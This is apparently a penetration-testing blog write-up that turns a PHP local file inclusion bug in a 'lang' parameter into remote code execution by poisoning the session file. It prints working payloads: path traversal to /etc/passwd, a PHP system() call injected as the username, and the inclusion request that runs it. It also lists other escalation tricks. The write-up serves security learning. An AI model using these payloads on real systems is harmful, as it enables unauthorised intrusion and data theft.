Source: https://www.rcesecurity.com/2017/08/from-lfi-to-rce-via-php-sessions/

A Simple Local File Inclusion Vulnerability


The vulnerable web application basically required some form of authentication before giving access to an 
administrative upload interface. 
However the application did also use one smelly parameter called “lang” to specify the language for its UI:

login=1&user=admin&pass=admin&lang=en_us.php

So this was quite obvious to exploit - at the very first glance - you only had to use path traversal sequences:
login=1&user=admin&pass=admin&lang=../../../../../../../../../../etc/passwd

This simply fetched the /etc/passwd file and echoed it back in the HTTP response.


Some common ways of upgrading from LFI to RCE

So there’s a variety of different tricks to turn your LFI into RCE, just like:

- Using file upload forms/functions
- Using the PHP wrapper expect://command
- Using the PHP wrapper php://file
- Using the PHP wrapper php://filter
- Using PHP input:// stream
- Using data://text/plain;base64,command
- Using /proc/self/environ
- Using /proc/self/fd
- Using log files with controllable input like:
    + /var/log/apache/access.log
    + /var/log/apache/error.log
    + /var/log/vsftpd.log
    + /var/log/sshd.log
    + /var/log/mail
    
    
In this case, any of the above mentioned ways was silently failing with the application just returning its normal 
“authentication failed” response.

---------------------------------------
RCE Using Control over PHP Session Values

When trying to authenticate with invalid credentials such as admin/admin:

The application issued a couple of Set-Cookie instructions like the following, 
which strongly indicates that the values from the authentication requests might be 
stored within the PHP session on the server side:

Set-Cookie: PHPSESSID=i56kgbsq9rm8ndg3qbarhsbm27; path=/
Set-Cookie: user=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly
Set-Cookie: pass=admin; expires=Mon, 13-Aug-2018 20:21:29 GMT; path=/; httponly

As you might know PHP5 stores it’s session files by default under /var/lib/php5/sess_[PHPSESSID]
- so the above issued session “i56kgbsq9rm8ndg3qbarhsbm27” would be stored under 
/var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27.

When having a look at the session file itself using the previously discovered LFI vulnerability:
login=1&user=admin&pass=admin&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

indicators even got stronger:
user_ip|s:0:"";loggedin|s:0:"";lang|s:9:"en_us.php";win_lin|s:0:"";user|s:6:"admin";pass|s:6:"admin";

So as a consequence out of this, using some arbitrary PHP code as the username:

login=1&user=<?php system("cat /etc/passwd");?>&pass=password&lang=en_us.php

Resulted in an arbitrary value being set in the Set-Cookie directive (and therefore in the session file):
Set-Cookie: user=%3C%3Fphp+system%28%22cat+%2Fetc%2Fpasswd%22%29%3B%3F%3E; expires=Mon, 13-Aug-2018 20:40:53 GMT; path=/; httponly

The session file could again afterwards be included using the LFI (note that you need to remove the cookie from the request, otherwise it would get overwritten again and the payload would fail):
login=1&user=admin&pass=password&lang=/../../../../../../../../../var/lib/php5/sess_i56kgbsq9rm8ndg3qbarhsbm27

Which resulted in the final Remote Code Execution.



